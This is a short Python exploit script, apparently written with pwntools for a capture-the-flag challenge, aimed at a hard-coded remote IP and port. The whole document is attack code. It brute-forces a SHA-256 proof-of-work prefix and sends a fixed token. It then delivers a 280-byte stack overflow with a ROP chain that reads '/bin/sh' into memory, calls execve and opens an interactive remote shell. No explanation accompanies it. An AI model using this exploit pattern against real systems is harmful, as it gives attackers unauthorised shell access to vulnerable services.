import hashlib,sys,socket,re
from pwn import *


io=remote('49.4.51.149',25391) 
io.recv(1024)
data = io.recv(1024)
print data
skr_sha256 = re.findall('hashlib.sha256\(skr\).hexdigest\(\)=(.*?)\n', data)[0]
skr = re.findall('skr\[0:5\].encode\(\'hex\'\)=(.*?)\n', data)[0].decode('hex')



while True:
    for i in range(255, 1, -1):
        for j in range(255, 1, -1):
            for k in range(255, 1, -1):
                temp = skr + chr(i) + chr(j) + chr(k)
                _sha256 = hashlib.new('sha256')
                _sha256.update(temp)
                if _sha256.hexdigest() == skr_sha256:
                    print temp.encode('hex'),i,j,k
                    io.send(temp.encode('hex')+'\r\n')
                    print io.recv(1024)
                    io.send('4c69fe806a9daf27c4a5f301e0dc41ef'+'\r\n')
                    syscall = 0x0000000000461645
                    bss = 0x6a4e40
                    pop_rdi_ret = 0x4005f6
                    pop_rsi_ret = 0x405895
                    pop_rdx_ret = 0x43b9d5
                    pop_rax_ret = 0x43b97c
                    io.recv()
                    io.send('A'*280 + p64(pop_rdi_ret) +p64(0x0) + p64(pop_rsi_ret) + p64(bss) + p64(pop_rdx_ret) + p64(0x20) + p64(pop_rax_ret) + p64(0) + p64(syscall) + p64(pop_rax_ret) + p64(0) + p64(pop_rsi_ret) + p64(0x0) + p64(pop_rdx_ret) + p64(0x0) + p64(pop_rax_ret) + p64(59) + p64(pop_rdi_ret) + p64(bss) + p64(syscall))
                    io.recv()
                    io.send('/bin/sh\x00')
                    
                    io.interactive()
                    exit(1)